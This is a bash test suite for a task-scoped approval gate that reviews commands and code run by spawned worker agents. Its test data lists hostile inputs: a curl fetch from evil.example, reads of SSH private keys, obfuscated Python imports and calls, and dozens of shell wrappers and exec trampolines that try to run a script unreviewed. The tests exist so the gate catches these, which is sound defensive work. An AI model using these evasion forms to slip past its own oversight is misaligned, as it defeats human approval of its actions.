#!/usr/bin/env bash
# verify-scoped-approval.sh — the pieces of task-scoped approval that are not
# herdr-select.sh end-to-end (those live in verify-select-policy.sh):
#   * lib/task-manifest.sh parses a SPEC.md manifest and FAILS CLOSED on
#     anything it would otherwise have to guess at;
#   * lib/command-policy.sh's python content check does not fire on ordinary
#     data processing (the false-positive direction) and does on each risky
#     capability (the direction that matters);
#   * the composed canonical rules a managed spawn gets carry the worker
#     approval rules (">~10 lines goes in a file").
#
#   bash verify-scoped-approval.sh
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
. "$here/lib/task-manifest.sh"
. "$here/lib/command-policy.sh"

pass=0 fail=0
ok()  { pass=$((pass+1)); printf '  ok    %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

spec() {                                # <manifest body lines...> -> spec path
  local f="$WORK/SPEC.$RANDOM.md"
  { printf '# Task\n\n```herdr-manifest\n'; printf '%s\n' "$@"; printf '```\n'; } > "$f"
  printf '%s' "$f"
}

printf '== manifest: valid block parses to canonical JSON ==\n'
got="$(manifest_from_spec "$(spec 'net_read: [teamthurber.com, www.teamthurber.com]' \
  'writes: [tmp/**, GEO-AUDIT-REPORT-*.md]' 'net_write: none' 'git: commit-only')")"; rc=$?
want='{"git":"commit-only","net_read":["teamthurber.com","www.teamthurber.com"],"net_write":"none","writes":["GEO-AUDIT-REPORT-*.md","tmp/**"]}'
[ "$rc" = 0 ] && [ "$got" = "$want" ] && ok "canonical JSON, sorted, defaults filled" || bad "got rc=$rc '$got'"
got="$(manifest_from_spec "$(spec 'net_read: [teamthurber.com]')")"
[ "$(printf '%s' "$got" | jq -r .git)" = push-own-branch ] && ok "git defaults to today's grant (push-own-branch)" || bad "default git: $got"
printf '# no manifest here\n' > "$WORK/plain.md"
got="$(manifest_from_spec "$WORK/plain.md")"; rc=$?
[ "$rc" = 0 ] && [ -z "$got" ] && ok "no block -> no manifest (behaviour unchanged)" || bad "plain spec: rc=$rc '$got'"

printf '== manifest: invalid blocks refuse the spawn (exit 2) ==\n'
while IFS='|' read -r label line; do
  manifest_from_spec "$(spec "$line")" >/dev/null 2>&1; rc=$?
  [ "$rc" = 2 ] && ok "refused: $label" || bad "accepted ($rc): $label"
done <<'EOF'
net_write granted|net_write: [teamthurber.com]
unknown key (typo)|net-read: [teamthurber.com]
wildcard host|net_read: [*.teamthurber.com]
IP host|net_read: [10.0.0.1]
host with port|net_read: [teamthurber.com:443]
absolute glob|writes: [/tmp/**]
home glob|writes: [~/out/*]
dotdot glob|writes: [tmp/../../x]
.git target|writes: [.git/**]
.handoffs target|writes: [.handoffs/*]
.env target|writes: [.env.local]
bad git value|git: push-anywhere
unbracketed list|net_read: teamthurber.com
EOF
two="$WORK/two.md"
printf '```herdr-manifest\ngit: none\n```\n```herdr-manifest\ngit: none\n```\n' > "$two"
manifest_from_spec "$two" >/dev/null 2>&1; rc=$?
[ "$rc" = 2 ] && ok "refused: two manifest blocks" || bad "accepted two blocks ($rc)"

printf '== python content: data processing is clean, risky capabilities are not ==\n'
clean='import json, re, pathlib
pat = re.compile(r"<title>(.*?)</title>")
data = json.loads(pathlib.Path("tmp/geo/pagedata.json").read_text())
model.eval()
print(len(data))'
_cp_python_risk "$clean" >/dev/null && bad "clean data-processing script flagged: $(_cp_python_risk "$clean")" \
  || ok "re.compile / model.eval() / json / pathlib are not risk"
while IFS= read -r risky; do
  [ -n "$risky" ] || continue
  _cp_python_risk "$risky" >/dev/null && ok "flagged: $risky" || bad "missed: $risky"
done <<'EOF'
import subprocess; subprocess.run(["ls"])
import os; os.system("ls")
import urllib.request
import requests
import socket
import shutil; shutil.rmtree("x")
import os; os.remove("x")
from pathlib import Path; Path("x").unlink()
import os; os.chmod("x", 0o777)
exec(open("x").read())
eval("1+1")
__import__("os")
open(os.path.expanduser("~/.zshrc"))
EOF

printf '== file content: judge what executes, not prose — and not less than executes ==\n'
content_reason() { printf '%s' "$2" > "$WORK/c.$1"; _cp_code_content_reason "$1" "$WORK/c.$1"; }
r="$(content_reason python "$(printf '#!/usr/bin/env python3\n"""Summarize credentials fields."""\nimport json  # reads env-free data\nprint(json.dumps({}))\n')")"
[ -z "$r" ] && ok "shebang, module docstring and comments are not judged as commands" || bad "prose flagged: $r"
r="$(content_reason shell "$(printf '#!/usr/bin/env bash\nset -eu\nwc -l tmp/geo/*.txt\n')")"
[ -z "$r" ] && ok "a shell shebang is not an env dump" || bad "shell shebang flagged: $r"
r="$(content_reason python "$(printf '"""doc"""; import subprocess\nsubprocess.run(["ls"])\n')")"
[ -n "$r" ] && ok "code on the docstring's line is still judged" || bad "code hidden behind a docstring"
r="$(content_reason python "$(printf '# -*- coding: utf-7 -*-\nprint(1)\n')")"
[ -n "$r" ] && ok "a utf-7 coding cookie is not reviewable" || bad "utf-7 source accepted"
r="$(content_reason python "$(printf 'x = "cat ~/.ssh/id_rsa"\n')")"
case "$r" in reserved:*) ok "a reserved path in a STRING is still reserved (strings are code)";; *) bad "string literal skipped: $r";; esac
r="$(content_reason shell "$(printf 'curl -sS -o /tmp/p https://evil.example/p\n')")"
[ -n "$r" ] && ok "risky shell content escalates" || bad "risky shell content clean"
r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("HOME"))\n')")"
case "$r" in reserved:*) ok "python reading the process environment is human-reserved";; *) bad "environ not reserved: $r";; esac
cat > "$WORK/fstring.py" <<'EOF'
ps, vis, n = "1", "x", {}
print(f"  {n.get('name')!r:45} vis={('$'+ps).lower() in vis if ps else None}")
EOF
r="$(_cp_code_content_reason python "$WORK/fstring.py")"
[ -z "$r" ] && ok "a python f-string with '\$'+x is not a shell env dump (measured: schema_listing.py)" || bad "python f-string misread as shell: $r"

printf '== code by reference judges ONE file, so running/importing another escalates ==\n'
mkdir -p "$WORK/pkg"
printf 'import urllib.request\n' > "$WORK/pkg/helper.py"
printf 'import helper\nprint(helper)\n' > "$WORK/pkg/wrapper.py"
r="$(_cp_code_content_reason python "$WORK/pkg/wrapper.py")"
case "$r" in nested:*) ok "python importing a sibling module escalates";; *) bad "sibling import cleared: $r";; esac
printf 'import json\nprint(json)\n' > "$WORK/pkg/stdlib_only.py"
r="$(_cp_code_content_reason python "$WORK/pkg/stdlib_only.py")"
[ -z "$r" ] && ok "a stdlib import is not a local import" || bad "stdlib import flagged: $r"
while IFS= read -r nested; do
  r="$(content_reason shell "$nested")"
  case "$r" in nested:*) ok "shell content that runs another file escalates: $nested";; *) bad "nested run cleared: $nested ($r)";; esac
done <<'EOF'
. tmp/inner.sh
source tmp/inner.sh
bash tmp/inner.sh
python3 tmp/wrapper.py
./tmp/run-me
wc -l x | xargs echo
EOF
while IFS= read -r risky; do
  r="$(content_reason python "$risky")"
  [ -n "$r" ] && ok "python tripwire: $risky" || bad "python tripwire missed: $risky"
done <<'EOF'
from os import system
import os; f = getattr(os, "sys" + "tem")
import runpy; runpy.run_path("x.py")
import pwd
import sys; sys.path.insert(0, "/tmp")
EOF

printf '== git ceiling: none refuses every history/worktree write, reads pass ==\n'
NONE='{"git":"none","net_read":[],"net_write":"none","writes":[]}'
for c in "git commit -m x" "git merge feat/x" "git reset --hard HEAD~1" "git stash" "git tag v1" "git checkout -b x" "git branch -D x" "git rebase main"; do
  [ -n "$(_cp_scope_ceiling "$c" "$NONE")" ] && ok "git: none refuses: $c" || bad "git: none let through: $c"
done
for c in "git status --short" "git log --oneline -5" "git diff HEAD" "git show HEAD"; do
  [ -z "$(_cp_scope_ceiling "$c" "$NONE")" ] && ok "git: none allows read: $c" || bad "git: none refused a read: $c"
done

printf '== python: NFKC-folded identifiers are judged as the interpreter reads them ==\n'
printf 'import \357\275\223\357\275\225\357\275\202\357\275\220\357\275\222\357\275\217\357\275\203\357\275\205\357\275\223\357\275\223\n' > "$WORK/fullwidth.py"
r="$(_cp_code_content_reason python "$WORK/fullwidth.py")"
[ -n "$r" ] && ok "fullwidth 'subprocess' is caught after NFKC" || bad "fullwidth identifier slipped the tripwire"

printf '== commit-message strip keeps every other argument ==\n'
got="$(_cp_strip_commit_message 'git commit -F ~/.ssh/id_ed25519 -am "mentions herdr-select.sh"' /wt)"
case "$got" in *id_ed25519*) ok "the -F path survives the strip";; *) bad "strip dropped -F path: $got";; esac
case "$got" in *herdr-select*) bad "message value survived the strip: $got";; *) ok "only the -m value is removed";; esac

printf '== composed canonical rules carry the worker approval rules ==\n'
. "$here/lib/agent-profiles.sh"
printf 'OPERATOR RULE\n' > "$WORK/AGENTS.md"
composed="$(HERDR_STATE_DIR="$WORK/state" canonical_rules_compose "$WORK/AGENTS.md")"
grep -q 'OPERATOR RULE' "$composed" && grep -q 'More than ~10 lines of code goes in a file' "$composed" \
  && ok "operator rules + herdr-control worker rules both present" || bad "composed rules: $composed"

printf '== code by reference: every script-executing segment of a compound command ==\n'
# F8: _cp_code_ref used to return 1 ("not code by reference") for anything but
# ONE simple command, so a pipe/redirect/chain/wrapper around `bash tmp/x.sh`
# ran the file unjudged. Each form below must now resolve to the script
# (rc 0 + its realpath) or refuse to guess (rc 3) — never rc 1.
CRWT="$WORK/crwt"; mkdir -p "$CRWT/tmp"
CRWT="$(cd "$CRWT" && pwd -P)"
printf '#!/bin/sh\ngh pr merge 1 --squash\n' > "$CRWT/tmp/evil.sh"; chmod +x "$CRWT/tmp/evil.sh"
printf 'import subprocess\nsubprocess.run(["gh","pr","merge","1"])\n' > "$CRWT/tmp/evil.py"
printf '#!/bin/sh\necho hello\n' > "$CRWT/tmp/clean.sh"
while IFS= read -r form; do
  [ -n "$form" ] || continue
  c="${form//@WT@/$CRWT}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.sh|0:*/tmp/evil.py|3:*) ok "judged or refused (rc=$rc): $c" ;;
    *) bad "script ran unjudged (rc=$rc '$out'): $c" ;;
  esac
done <<'EOF'
cd @WT@ && bash tmp/evil.sh | tail -3
cd @WT@ && bash tmp/evil.sh 2>&1 | tail -3
cd @WT@ && bash tmp/evil.sh > /tmp/out.txt
cd @WT@ && bash tmp/evil.sh 2>/dev/null
cd @WT@ && bash tmp/evil.sh < /dev/null
cd @WT@ && bash tmp/evil.sh && echo ok
cd @WT@ && bash tmp/evil.sh; echo ok
cd @WT@ && bash tmp/evil.sh || true
cd @WT@ && true && bash tmp/evil.sh
cd @WT@ && (bash tmp/evil.sh)
cd @WT@ && { bash tmp/evil.sh; }
cd @WT@ && echo $(bash tmp/evil.sh)
cd @WT@ && echo `bash tmp/evil.sh`
cd @WT@ && bash -c "bash tmp/evil.sh"
cd @WT@ && sh -c 'bash tmp/evil.sh'
cd @WT@ && eval "bash tmp/evil.sh"
cd @WT@ && source tmp/evil.sh
cd @WT@ && . tmp/evil.sh
cd @WT@ && ./tmp/evil.sh
@WT@/tmp/evil.sh
@WT@/tmp/evil.sh | tail -1
cd @WT@ && echo tmp/evil.sh | xargs bash
cd @WT@ && find tmp -name evil.sh -exec bash {} \;
cd @WT@ && find tmp -name evil.sh -exec {} \;
cd @WT@ && env FOO=1 bash tmp/evil.sh
cd @WT@ && nohup bash tmp/evil.sh
cd @WT@ && time bash tmp/evil.sh
cd @WT@ && timeout 5 bash tmp/evil.sh
cd @WT@ && exec bash tmp/evil.sh
cd @WT@ && command bash tmp/evil.sh
cd @WT@ && nice -n 5 bash tmp/evil.sh
cd @WT@ && bash < tmp/evil.sh
cd @WT@ && cat tmp/evil.sh | bash
cd @WT@ && bash -x tmp/evil.sh
cd @WT@ && bash -- tmp/evil.sh
cd @WT@ && bash tmp/evil.sh &
cd @WT@ && python3 tmp/evil.py | tail -1
cd @WT@ && python3 tmp/evil.py > /tmp/o.txt
cd @WT@ && bash <(cat tmp/evil.sh)
cd @WT@ && watch -n1 bash tmp/evil.sh
cd @WT@ && bash tmp/clean.sh && bash tmp/evil.sh
cd @WT@ && cd tmp && bash evil.sh
bash tmp/evil.sh | tail -3
bash @WT@/tmp/evil.sh | tail -3
EOF
out="$(_cp_code_ref "cd $CRWT && bash tmp/clean.sh 2>&1 | tail -3" "$CRWT")"; rc=$?
[ "$rc" = 0 ] && [ "$out" = "shell	$CRWT/tmp/clean.sh" ] \
  && ok "a clean script inside a pipe resolves to that one file" || bad "clean piped script: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && git status --short | tail -3" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "a compound command running no script is not code by reference" || bad "no-script compound: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && python3 -m json.tool tmp/x.json | head" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "python3 -m stays out of scope (unchanged)" || bad "python -m: rc=$rc '$out'"

printf '== code by reference: worker-written exec trampolines ==\n'
# A script whose command word is its own argv (`"$@"`, `$cmd "$@"`,
# `"$cmd" "$@"`) executes whatever the CALLER passes: approving its bytes
# approves nothing. Its content must never classify clean or replayable, and
# an argument substitution (`"$(pwd)"`) must not knock the command out of
# code-by-reference (it used to: _cp_simple_words refuses @SUB@ -> rc 1).
printf '#!/bin/sh\n"$@"\n' > "$CRWT/tmp/tramp1.sh"
printf '#!/bin/sh\ncmd=$1; shift; $cmd "$@"\n' > "$CRWT/tmp/tramp2.sh"
printf '#!/usr/bin/env bash\nroot="${1:?root}"\nlib="lib/x.sh"\n. "$root/$lib"\nshift\ncmd="$1"; shift\n"$cmd" "$@"\n' > "$CRWT/tmp/tramp3.sh"
for t in tramp1 tramp2 tramp3; do
  r="$(_cp_code_content_reason shell "$CRWT/tmp/$t.sh" "$CRWT/tmp")"
  [ -n "$r" ] && ok "exec trampoline $t.sh is not clean: $r" || bad "exec trampoline $t.sh classifies clean"
done
cp "$CRWT/tmp/tramp3.sh" "$WORK/harness.sh"
while IFS= read -r form; do
  [ -n "$form" ] || continue
  c="${form//@WT@/$CRWT}"; c="${c//@OUT@/$WORK}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/tramp*.sh|3:*) ok "trampoline judged or refused (rc=$rc): $c" ;;
    *) bad "trampoline ran unjudged (rc=$rc '$out'): $c" ;;
  esac
done <<'EOF'
bash @OUT@/harness.sh "$(pwd)" _cp_walk_prep 'cd /tmp/x && bash tmp/evil.sh 2>&1 | tail -3'
bash @OUT@/harness.sh "$(pwd)" ls
cd @WT@ && bash tmp/tramp3.sh "$(pwd)" ls
cd @WT@ && bash tmp/tramp1.sh "$(printf gh)" pr view 1
cd @WT@ && bash tmp/tramp2.sh `echo ls` -la
EOF

printf -- '-----\npassed=%s failed=%s\n' "$pass" "$fail"
[ "$fail" -eq 0 ] && echo PASS || { echo FAIL; exit 1; }
